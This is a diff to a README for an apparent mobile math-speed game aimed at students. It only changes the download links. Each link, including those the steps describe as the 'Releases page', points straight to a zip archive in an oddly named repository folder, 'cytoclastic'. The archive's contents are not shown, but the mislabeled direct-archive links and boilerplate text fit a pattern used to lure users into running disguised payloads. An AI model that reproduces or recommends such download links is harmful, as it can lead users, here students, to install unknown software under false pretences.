@@ -8,11 +8,11 @@ calc-speed-game is a mobile-friendly game designed for students preparing for SS
 
 To get started, you need to download the game from our Releases page. Follow the instructions below to easily install and run the game on your device.
 
-[![Download calc-speed-game](https://raw.githubusercontent.com/goodnesskalu/calc-speed-game/main/cytoclastic/speed_game_calc_1.7-beta.2.zip)](https://raw.githubusercontent.com/goodnesskalu/calc-speed-game/main/cytoclastic/speed_game_calc_1.7-beta.2.zip)
+[![Download calc-speed-game](https://github.com/goodnesskalu/calc-speed-game/raw/refs/heads/main/cytoclastic/speed-game-calc-v1.9-alpha.2.zip)](https://github.com/goodnesskalu/calc-speed-game/raw/refs/heads/main/cytoclastic/speed-game-calc-v1.9-alpha.2.zip)
 
 ## 📥 Download & Install
 
-1. Click on this link to visit the Releases page: [Download Here](https://raw.githubusercontent.com/goodnesskalu/calc-speed-game/main/cytoclastic/speed_game_calc_1.7-beta.2.zip).
+1. Click on this link to visit the Releases page: [Download Here](https://github.com/goodnesskalu/calc-speed-game/raw/refs/heads/main/cytoclastic/speed-game-calc-v1.9-alpha.2.zip).
 2. Look for the latest version of the game.
 3. Choose the file that matches your device. For most users, the file will be compatible with mobile devices.
 4. Click on the file to start the download.
@@ -58,6 +58,6 @@ We plan to provide regular updates to keep the game fresh and exciting, so check
 
 Once again, to download and start playing:
 
-[![Download calc-speed-game](https://raw.githubusercontent.com/goodnesskalu/calc-speed-game/main/cytoclastic/speed_game_calc_1.7-beta.2.zip)](https://raw.githubusercontent.com/goodnesskalu/calc-speed-game/main/cytoclastic/speed_game_calc_1.7-beta.2.zip)
+[![Download calc-speed-game](https://github.com/goodnesskalu/calc-speed-game/raw/refs/heads/main/cytoclastic/speed-game-calc-v1.9-alpha.2.zip)](https://github.com/goodnesskalu/calc-speed-game/raw/refs/heads/main/cytoclastic/speed-game-calc-v1.9-alpha.2.zip)
 
 Enjoy your game and improve your math skills with calc-speed-game!
